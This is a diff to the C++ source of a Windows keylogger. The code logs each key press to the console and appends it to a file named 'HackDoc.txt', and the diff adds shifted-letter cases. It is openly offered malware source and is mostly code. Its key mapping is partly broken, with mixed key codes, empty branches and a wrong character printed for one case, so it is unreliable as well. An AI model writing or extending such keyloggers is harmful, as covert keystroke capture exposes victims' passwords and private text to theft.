@@ -10,7 +10,6 @@ void WriteToFile(LPCSTR text)
 {
 	std::ofstream doc_to;
 	doc_to.open("HackDoc.txt", std::fstream::app);
-	std::string _chars;
 	doc_to << text;
 	doc_to.close();
 }
@@ -27,11 +26,6 @@ bool Key_is_Listed(WORD iKey)
 	case VK_F1:
 		std::cout << " *F1* ";
 		WriteToFile(" *F1* ");
-		break;
-
-	case 107:
-		std::cout << "k";
-		WriteToFile("k");
 		break;
 
 	case 48:
@@ -86,54 +80,50 @@ bool Key_is_Listed(WORD iKey)
 		break;
 
 	case 58:
-		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		if (GetAsyncKeyState(VK_LSHIFT))
 		{
 			std::cout << ":";
 			WriteToFile(":");
 		}
-		else
-		{
-
-		}
 		break;
 
 	case 59:
-		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		if (GetAsyncKeyState(VK_LSHIFT))
 		{
 
 		}
 		break;
 
 	case 60:
-		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		if (GetAsyncKeyState(VK_LSHIFT))
 		{
 
 		}
 		break;
 
 	case 61:
-		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		if (GetAsyncKeyState(VK_LSHIFT))
 		{
 
 		}
 		break;
 
 	case 62:
-		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		if (GetAsyncKeyState(VK_LSHIFT))
 		{
 
 		}
 		break;
 
 	case 63:
-		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		if (GetAsyncKeyState(VK_LSHIFT))
 		{
 			
 		}
 		break;
 
 	case 64:
-		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		if (GetAsyncKeyState(VK_LSHIFT))
 		{
 			std::cout << "A";
 			WriteToFile("A");
@@ -141,16 +131,26 @@ bool Key_is_Listed(WORD iKey)
 		break;
 
 	case 65:
-		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		if (GetAsyncKeyState(VK_LSHIFT))
 		{
-
+			std::cout << "A";
+			WriteToFile("A");
 		}
 		break;
 
 	case 66:
-		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		if (GetAsyncKeyState(VK_LSHIFT))
 		{
+			std::cout << "B";
+			WriteToFile("B");
+		}
+		break;
 
+	case 75:
+		if (GetAsyncKeyState(VK_LSHIFT))
+		{
+			std::cout << "K";
+			WriteToFile("K");
 		}
 		break;
 
